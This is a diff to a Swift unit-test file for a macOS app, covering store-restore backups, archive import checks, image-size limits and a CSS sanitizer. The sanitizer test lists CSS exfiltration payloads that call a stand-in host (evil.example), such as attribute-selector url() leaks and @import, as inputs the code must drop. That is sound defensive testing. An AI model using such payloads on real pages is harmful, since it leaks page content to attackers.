@@ -1149,9 +1149,9 @@ final class ChorusTests: XCTestCase {
         )
     }
 
-    /// `restoreFromSnapshot` must copy the snapshot's data back and keep exactly
-    /// one prerestore backup of the bad store across repeated calls.
-    func testRestoreFromSnapshotBacksUpOnceAndCopiesData() throws {
+    /// `restoreFromSnapshot` must copy the snapshot's data back and set the
+    /// replaced store aside every time, in a bounded family.
+    func testRestoreFromSnapshotSetsTheStoreAsideEveryTimeAndCopiesData() throws {
         let dir = URL(fileURLWithPath: NSTemporaryDirectory())
             .appendingPathComponent("chorus-restore-\(UUID().uuidString)", isDirectory: true)
         try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
@@ -1164,7 +1164,7 @@ final class ChorusTests: XCTestCase {
         XCTAssertEqual(StoreRepair.spaceCount(at: storeURL), 0, "precondition: store emptied")
 
         let candidate = try XCTUnwrap(StoreRepair.newestRestorableSnapshot(for: storeURL))
-        XCTAssertTrue(StoreRepair.restoreFromSnapshot(candidate, to: storeURL))
+        XCTAssertTrue(StoreRepair.restoreFromSnapshot(candidate, to: storeURL, stamp: "1700000100"))
         XCTAssertEqual(StoreRepair.spaceCount(at: storeURL), 3, "restore must bring the data back")
 
         func prerestoreStamps() throws -> Set<String> {
@@ -1173,12 +1173,47 @@ final class ChorusTests: XCTestCase {
             // Collapse the triple (…, -wal, -shm) to distinct stamps.
             return Set(names.map { $0.replacingOccurrences(of: "-wal", with: "").replacingOccurrences(of: "-shm", with: "") })
         }
-        let after1 = try prerestoreStamps()
-        XCTAssertEqual(after1.count, 1, "exactly one prerestore backup after first restore")
+        XCTAssertEqual(try prerestoreStamps().count, 1, "the replaced store is set aside")
+        let aside = storeURL.path + ".prerestore-1700000100.bak"
+        XCTAssertEqual(StoreRepair.spaceCount(at: URL(fileURLWithPath: aside)), 0, "the aside holds the store as it was")
 
-        // Second restore must NOT stack another backup.
-        _ = StoreRepair.restoreFromSnapshot(candidate, to: storeURL)
-        XCTAssertEqual(try prerestoreStamps(), after1, "second restore must not add another prerestore backup")
+        // A later, unrelated restore still sets aside what it replaces. Before,
+        // any existing copy made every later restore skip its own.
+        try Self.runSQLite(storeURL, "DELETE FROM ZSPACE WHERE Z_PK = (SELECT MIN(Z_PK) FROM ZSPACE);")
+        XCTAssertTrue(StoreRepair.restoreFromSnapshot(candidate, to: storeURL, stamp: "1700000200"))
+        XCTAssertEqual(StoreRepair.spaceCount(at: URL(fileURLWithPath: storeURL.path + ".prerestore-1700000200.bak")), 2,
+                       "the second restore kept its own copy of the two-space store")
+
+        // A loop of restores stays bounded: the newest three plus the oldest.
+        for stamp in 1700000300...1700000306 {
+            _ = StoreRepair.restoreFromSnapshot(candidate, to: storeURL, stamp: String(stamp))
+        }
+        let kept = try prerestoreStamps()
+        XCTAssertEqual(kept.count, 4)
+        XCTAssertTrue(kept.contains("store.sqlite.prerestore-1700000100.bak"), "the oldest copy survives")
+    }
+
+    /// If the replaced store can't be set aside, it must not be deleted.
+    func testRestoreFromSnapshotLeavesTheStoreAloneWhenTheAsideFails() throws {
+        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
+            .appendingPathComponent("chorus-restore-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        let storeURL = dir.appendingPathComponent("store.sqlite")
+        defer {
+            try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: dir.path)
+            try? FileManager.default.removeItem(at: dir)
+        }
+
+        try makePopulatedStore(at: storeURL, spaces: 3)
+        StoreRepair.snapshot(at: storeURL, stamp: "1700000000-1.0.0")
+        try Self.runSQLite(storeURL, "DELETE FROM ZSPACE WHERE Z_PK = (SELECT MIN(Z_PK) FROM ZSPACE);")
+        let candidate = try XCTUnwrap(StoreRepair.newestRestorableSnapshot(for: storeURL))
+
+        // A read-only directory: no aside can be written there.
+        try FileManager.default.setAttributes([.posixPermissions: 0o555], ofItemAtPath: dir.path)
+        XCTAssertFalse(StoreRepair.restoreFromSnapshot(candidate, to: storeURL, stamp: "1700000100"))
+        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: dir.path)
+        XCTAssertEqual(StoreRepair.spaceCount(at: storeURL), 2, "the live store is untouched")
     }
 
     /// End-to-end: a store that had data but comes up empty, with a good snapshot
@@ -2864,6 +2899,67 @@ final class ChorusTests: XCTestCase {
         XCTAssertEqual(try target.mainContext.fetch(FetchDescriptor<SpaceServiceLink>()).count, 1, "one link, not two")
     }
 
+    /// A file that docks Chorus inside itself is refused, as adding it by hand is.
+    @MainActor
+    func testSetupArchiveRefusesChorusAsAMacApp() throws {
+        let source = try makeGroupingContainer()
+        let src = source.mainContext
+        let space = Space(name: "Chat", emoji: "💬", sortOrder: 0)
+        let chorus = ServiceInstance(label: "Slack", url: NativeApp.serviceURL(forBundleID: "com.nicojan.Chorus"))
+        src.insert(space)
+        src.insert(chorus)
+        try src.save()
+        link(chorus, to: space, sortOrder: 0, in: src)
+        try src.save()
+
+        let data = try SetupArchive.capture(from: src, appVersion: nil).encoded()
+        XCTAssertThrowsError(try SetupArchive.decode(data))
+    }
+
+    /// Imported CSS that could load something, and so send page content away,
+    /// is dropped; CSS that only restyles the page is kept.
+    func testImportedCSSThatCouldReachOutsideThePageIsDropped() {
+        XCTAssertEqual(SetupArchive.importableCSS("body { color: red; }"), "body { color: red; }")
+        XCTAssertNil(SetupArchive.importableCSS(nil))
+        XCTAssertNil(SetupArchive.importableCSS("  \n"))
+        for css in [
+            #"input[value^="a"] { background: url(https://evil.example/a) }"#,
+            #"div { background: URL("https://evil.example") }"#,
+            #"@import "https://evil.example/x.css";"#,
+            #"div { background: -webkit-image-set("https://evil.example/a.png" 1x) }"#,
+            #"div { background: image("https://evil.example/a.png") }"#,
+            #"div { background: cross-fade(50% "a.png", "b.png") }"#,
+            #"div { background: src("https://evil.example") }"#,
+            #"div { background: \75 rl(https://evil.example) }"#,
+        ] {
+            XCTAssertNil(SetupArchive.importableCSS(css), css)
+        }
+    }
+
+    /// Icon data from outside is shrunk to a small PNG, and an image too large
+    /// to decode safely, or data that isn't an image, is refused.
+    func testIconThumbnailShrinksAndRefusesOversizedImages() throws {
+        func png(width: Int, height: Int) throws -> Data {
+            let context = try XCTUnwrap(CGContext(
+                data: nil, width: width, height: height, bitsPerComponent: 8, bytesPerRow: 0,
+                space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue))
+            context.setFillColor(CGColor(red: 1, green: 0, blue: 0, alpha: 1))
+            context.fill(CGRect(x: 0, y: 0, width: width, height: height))
+            let image = try XCTUnwrap(context.makeImage())
+            let rep = NSBitmapImageRep(cgImage: image)
+            return try XCTUnwrap(rep.representation(using: .png, properties: [:]))
+        }
+
+        let shrunk = try XCTUnwrap(IconThumbnail.png(from: png(width: 1024, height: 512)))
+        let rep = try XCTUnwrap(NSBitmapImageRep(data: shrunk))
+        XCTAssertEqual(rep.pixelsWide, 128)
+        XCTAssertEqual(rep.pixelsHigh, 64)
+
+        XCTAssertNil(IconThumbnail.png(from: try png(width: 300, height: 300), maxSourcePixels: 200 * 200),
+                     "past the pixel limit, read from the header without decoding")
+        XCTAssertNil(IconThumbnail.png(from: Data([1, 2, 3])), "not an image")
+    }
+
     /// A Mac app in a space survives export and import, and is not listed as
     /// a site in the import confirmation.
     @MainActor
@@ -2881,6 +2977,7 @@ final class ChorusTests: XCTestCase {
         let archive = try SetupArchive.decode(SetupArchive.capture(from: src, appVersion: nil).encoded())
         XCTAssertEqual(archive.services.map(\.url), ["chorus-app://jp.naver.line.mac"])
         XCTAssertEqual(archive.hosts, [])
+        XCTAssertEqual(archive.macApps, ["jp.naver.line.mac"], "the confirmation names Mac apps on their own line")
 
         let target = try makeGroupingContainer()
         let summary = try archive.apply(to: target.mainContext)
@@ -6360,12 +6457,16 @@ final class ChorusTests: XCTestCase {
             isDamaged: false
         )
 
+        // A fresh start chosen earlier and still waiting must not set this
+        // restore aside the moment it lands.
+        defaults.set(true, forKey: StoreRepair.pendingResetKey)
         XCTAssertTrue(AppState.scheduleRestore(candidate, storeName: storeURL.lastPathComponent, defaults: defaults))
         XCTAssertEqual(
             defaults.string(forKey: StoreRepair.pendingRestoreKey),
             name,
             "the written key must be exactly what applyPendingRestore validates against"
         )
+        XCTAssertFalse(defaults.bool(forKey: StoreRepair.pendingResetKey), "the latest choice wins")
     }
 
     /// A non-restorable candidate (here: damaged) must write nothing at all —
